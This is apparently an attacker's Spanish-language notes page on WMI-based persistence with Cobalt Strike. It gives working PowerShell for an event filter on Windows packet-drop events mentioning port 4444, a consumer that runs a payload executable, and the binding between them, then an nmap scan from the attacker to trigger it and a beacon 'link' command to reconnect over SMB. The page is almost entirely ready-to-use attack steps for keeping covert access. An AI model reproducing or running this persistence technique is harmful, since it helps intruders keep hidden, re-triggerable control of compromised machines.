---
title: WMI — Remote Triggers
tags: [wmi, persistence, remote-trigger, cobalt-strike, smb]
---

# WMI Remote Triggers

## Concepto

Usar WMI para disparar un Beacon remotamente cuando se detecta tráfico de red específico (ej: un portscan en el puerto 4444).

## 1. Habilitar auditoría de filtrado de red

```powershell
# Habilitar Event ID 5152 (Windows Filtering Platform Packet Drop)
auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable
```

## 2. Crear el Filter (puerto 4444 bloqueado)

```powershell
$filterArgs = @{
    Name          = "PortTrigger"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 5152 AND TargetInstance.Message LIKE '%4444%'"
}
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs
```

## 3. Crear el Consumer (conectar Beacon SMB)

```powershell
$consumerArgs = @{
    Name            = "PortConsumer"
    CommandLineTemplate = "C:\Windows\System32\payload.exe"
}
$consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs
```

## 4. Binding

```powershell
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter; Consumer = $consumer
}
```

## 5. Disparar desde el atacante

```bash
# Portscan al puerto 4444 del target para activar el trigger
nmap -p 4444 <target-ip>
```

## 6. Conectar el Beacon SMB

```
beacon> link <target-ip> beacon-smb-pipe
```

> [!tip] Muy útil para re-establecer acceso cuando el beacon principal muere — basta con escanear el puerto configurado.
